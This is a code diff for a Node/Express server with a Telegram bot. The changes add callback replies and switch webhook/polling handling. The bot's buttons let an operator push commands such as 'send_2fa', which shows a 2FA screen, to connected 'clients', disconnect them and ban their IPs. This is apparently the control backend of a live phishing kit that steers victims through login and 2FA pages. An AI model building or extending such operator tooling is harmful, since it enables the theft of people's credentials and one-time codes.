@@ -27,7 +27,12 @@ bot.on('error', (err) => {
   console.error('Telegram bot error:', err && err.message ? err.message : err);
 });
 
+/** Same as old jobback-main: clear webhook on Telegram immediately so getUpdates (polling) receives button clicks. */
 if (usePolling) {
+  bot.deleteWebHook().then(() => {
+    console.log('Webhook deleted. Polling started.');
+  }).catch((err) => console.error('Telegram deleteWebHook (startup):', err.message));
+
   let polling409Logged = false;
   bot.on('polling_error', (err) => {
     const msg = err && err.message ? String(err.message) : String(err);
@@ -74,40 +79,33 @@ app.use(cors({
 }));
 
 /**
- * Telegram updates: register BEFORE express.json() and use raw body + JSON.parse.
- * Some hosts/proxies mis-handle application/json parsing; callback_query would never reach bot.processUpdate.
- * Telegram POST must run BEFORE express-session — otherwise every webhook creates a new session (saveUninitialized).
+ * Webhook mode only when TELEGRAM_WEBHOOK_URL is set. Route before session (avoid session on each Telegram POST).
+ * Uses express.json like a typical Express + Telegram setup.
  */
 if (TELEGRAM_WEBHOOK_URL) {
   app.get('/telegram-webhook', (_req, res) => {
     res.status(200).type('text/plain').send('telegram webhook endpoint (Telegram uses POST)');
   });
-  app.post(
-    '/telegram-webhook',
-    express.raw({ type: '*/*', limit: '512kb' }),
-    (req, res) => {
-      try {
-        const buf = req.body;
-        if (!Buffer.isBuffer(buf) || buf.length === 0) {
-          console.warn('Telegram webhook: empty body', req.headers['content-type'] || '');
-          return res.sendStatus(200);
-        }
-        const text = buf.toString('utf8');
-        const update = JSON.parse(text);
+  app.post('/telegram-webhook', express.json({ limit: '512kb' }), (req, res) => {
+    try {
+      const body = req.body;
+      if (body && typeof body === 'object' && Object.keys(body).length > 0) {
         if (process.env.TELEGRAM_WEBHOOK_DEBUG === '1') {
           console.log(
             'Telegram webhook recv update_id=%s %s',
-            update.update_id,
-            update.callback_query ? 'callback_query' : ''
+            body.update_id,
+            body.callback_query ? 'callback_query' : ''
           );
         }
-        bot.processUpdate(update);
-      } catch (err) {
-        console.error('Telegram webhook parse/processUpdate:', err.message);
+        bot.processUpdate(body);
+      } else {
+        console.warn('Telegram webhook: empty JSON body', req.headers['content-type'] || '');
       }
-      res.sendStatus(200);
+    } catch (err) {
+      console.error('Telegram webhook processUpdate:', err.message);
     }
-  );
+    res.sendStatus(200);
+  });
 }
 
 app.use(express.json({ limit: '512kb' }));
@@ -243,18 +241,26 @@ const userData = {};          // clientId -> data
 const socketToClient = {};    // socket.id -> clientId
 const newUsers = new Set();
 
+/** Matches old jobback-main: one answerCallbackQuery per click with visible text (Telegram expects a single answer). */
 bot.on('callback_query', (query) => {
   if (!query || query.id == null) return;
 
-  bot.answerCallbackQuery(query.id).catch(() => {});
-
   try {
-    if (!query.data || typeof query.data !== 'string') return;
+    if (!query.data || typeof query.data !== 'string') {
+      bot.answerCallbackQuery(query.id, { text: 'Invalid request.' }).catch(() => {});
+      return;
+    }
     const colon = query.data.indexOf(':');
-    if (colon < 1) return;
+    if (colon < 1) {
+      bot.answerCallbackQuery(query.id, { text: 'Invalid data.' }).catch(() => {});
+      return;
+    }
     const command = query.data.slice(0, colon);
     const clientId = query.data.slice(colon + 1);
-    if (!clientId) return;
+    if (!clientId) {
+      bot.answerCallbackQuery(query.id, { text: 'Missing client id.' }).catch(() => {});
+      return;
+    }
 
     const map = {
       send_2fa: 'show-2fa',
@@ -268,8 +274,12 @@ bot.on('callback_query', (query) => {
 
     if (command === 'disconnect') {
       disconnectClient(clientId);
+      bot.answerCallbackQuery(query.id, { text: 'Client disconnected.' }).catch(() => {});
     } else if (map[command]) {
       const delivered = emitToClient(clientId, map[command]);
+      bot
+        .answerCallbackQuery(query.id, { text: `Sent ${command.replace(/_/g, ' ')}` })
+        .catch(() => {});
       const msg =
         `📩 *Command Sent to Client*\n\n` +
         `📤 *Command:* \`${command}\`\n` +
@@ -280,18 +290,18 @@ bot.on('callback_query', (query) => {
       const ip = userData[clientId]?.ip || lastKnownIpByClientId.get(clientId);
       if (ip) {
         banIp(ip);
+        bot.answerCallbackQuery(query.id, { text: `Banned IP: ${ip}` }).catch(() => {});
         disconnectClient(clientId);
         sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
       } else {
-        sendTelegramMessage(
-          `⚠️ *Ban IP failed*\n\nNo IP on record for client \`${clientId}\`. They may have never fully connected.`,
-          clientId,
-          false
-        );
+        bot.answerCallbackQuery(query.id, { text: 'IP not found for client.' }).catch(() => {});
       }
+    } else {
+      bot.answerCallbackQuery(query.id, { text: 'Unknown action.' }).catch(() => {});
     }
   } catch (err) {
     console.error('Telegram callback_query:', err.message);
+    bot.answerCallbackQuery(query.id, { text: 'Error.' }).catch(() => {});
   }
 });
 function formatDateTime(date) {
@@ -672,8 +682,8 @@ const PORT = Number(process.env.PORT) || 3001;
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
   if (process.env.RENDER === 'true' && !TELEGRAM_WEBHOOK_URL) {
-    console.warn(
-      'Render: TELEGRAM_WEBHOOK_URL is not set — inline buttons will not work. Add it as https://YOUR-SERVICE.onrender.com/telegram-webhook'
+    console.log(
+      'Telegram: long polling (same as old jobback script). Remove TELEGRAM_WEBHOOK_URL in Render env if you set it — mixing webhook + polling breaks updates. Only one process may use this bot token.'
     );
   }
   if (TELEGRAM_WEBHOOK_URL) {
@@ -704,13 +714,7 @@ server.listen(PORT, () => {
       })
       .catch((err) => console.error('Telegram setWebHook failed:', err));
   } else if (usePolling) {
-    bot
-      .deleteWebHook()
-      .then(() => {
-        console.log('Telegram long polling active');
-        setTimeout(logTelegramDiagnostics, 2000);
-      })
-      .catch((err) => console.error('Telegram deleteWebHook failed:', err));
+    setTimeout(logTelegramDiagnostics, 2000);
   } else {
     console.log('Telegram: polling disabled (TELEGRAM_POLLING=0); use TELEGRAM_WEBHOOK_URL or enable polling on one process only.');
   }
